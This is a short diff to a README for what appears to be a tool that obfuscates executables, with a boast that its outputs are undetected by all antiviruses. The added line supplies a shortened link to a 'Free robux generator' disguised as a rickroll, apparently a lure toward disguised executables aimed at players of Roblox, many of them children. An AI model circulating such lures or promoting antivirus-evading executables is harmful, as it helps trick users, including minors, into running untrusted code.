@@ -11,6 +11,8 @@ CURRENTLY, OBFUSCATOR DOESN'T OBFUSCATE FILES CORRECTLY. AS A RESULT, NOTHING CU
 Running this as default won't do much; you need to create your own .exe files!
 EXE files inside "install" were NOT MADE BY ME! These are only test files.
 
+_This is disguised as a rickroll. "Free robux generator" "disguised as rickroll" link: https://bit.ly/robuxgenrr_
+
 # Detection
 _All, unobfuscated and obfuscated: Undetected by all antiviruses as of 04/26/2022._ 
 
